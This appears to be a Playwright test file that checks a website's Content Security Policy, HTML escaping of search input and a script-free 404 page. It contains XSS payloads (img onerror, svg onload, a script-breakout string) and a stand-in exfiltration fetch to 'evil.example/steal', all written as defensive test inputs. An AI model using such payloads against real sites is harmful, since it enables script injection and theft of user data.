"""Security checks that need a real browser: the Content Security Policy blocks injected and outside scripts,
search input is never run as HTML, and the 404 page runs no scripts."""
import re

from conftest import ROOT, open_search


def _csp_violations(p):
    p.evaluate("""() => { window.__cspv = [];
        document.addEventListener('securitypolicyviolation', e => window.__cspv.push(e.violatedDirective + ' ' + e.blockedURI)); }""")


def test_csp_blocks_injected_inline_script(site):
    w = site()
    p = w.page
    _csp_violations(p)
    # what an attacker would try if they found a way to add markup: an inline script
    p.evaluate("""() => { window.__pwned = false; const s = document.createElement('script');
        s.textContent = 'window.__pwned = true'; document.body.appendChild(s); }""")
    p.wait_for_timeout(300)
    assert p.evaluate("window.__pwned") is False, "an injected inline script ran: the CSP is not blocking it"
    assert any("script-src" in v for v in p.evaluate("window.__cspv")), "no CSP violation was reported"
    w.errors.clear()  # Chrome logs the blocked script as a console error; that is the point of this test


def test_csp_blocks_outside_script_and_fetch(site):
    w = site()
    p = w.page
    _csp_violations(p)
    p.evaluate("""() => { const s = document.createElement('script'); s.src = 'https://evil.example/x.js';
        document.body.appendChild(s); fetch('https://evil.example/steal').catch(() => {}); }""")
    p.wait_for_timeout(500)
    v = " ".join(p.evaluate("window.__cspv"))
    assert "script-src" in v and "connect-src" in v, v
    # the requests were blocked by the browser before leaving: clear them from the outside-request list
    w.outside = [u for u in w.outside if "evil.example" not in u]
    w.errors.clear()


def test_inline_event_handlers_blocked(site):
    """HTML like <img onerror=...> must not run even if it got into the page."""
    w = site()
    p = w.page
    p.evaluate("""() => { window.__xss = 0; const d = document.createElement('div');
        d.innerHTML = '<img src="nope.png" onerror="window.__xss=1">'; document.body.appendChild(d); }""")
    p.wait_for_timeout(500)
    assert p.evaluate("window.__xss") == 0
    w.errors.clear()


def test_search_input_is_escaped(site):
    w = site()
    p = w.page
    for attack in ('<img src=x onerror="window.__x=1">', '"><svg onload=window.__x=1>', "</script><script>window.__x=1</script>"):
        open_search(p, attack)
        assert p.evaluate("window.__x") is None
        assert p.locator("#srch-list img, #srch-list svg[onload]").count() == 0
        p.keyboard.press("Escape")
        p.wait_for_timeout(200)


def test_csp_meta_is_strict():
    html = (ROOT / "index.html").read_text(encoding="utf8")
    m = re.search(r'<meta http-equiv="Content-Security-Policy" content="([^"]+)">', html)
    assert m, "no CSP meta tag"
    csp = m.group(1)
    assert "default-src 'self'" in csp and "object-src 'none'" in csp and "frame-src 'none'" in csp
    assert "'unsafe-eval'" not in csp
    script_src = re.search(r"script-src ([^;]+)", csp).group(1)
    assert "'unsafe-inline'" not in script_src and "http" not in script_src


def test_404_page(site, base_url):
    w = site(path="this/page/does-not-exist", wait=800)
    p = w.page
    assert "This page isn" in p.inner_text("h1")
    assert p.locator("script").count() == 0
    assert p.locator('a[href="/"]').count() >= 1
    resp = p.request.get(base_url + "nope-404-check")
    assert resp.status == 404
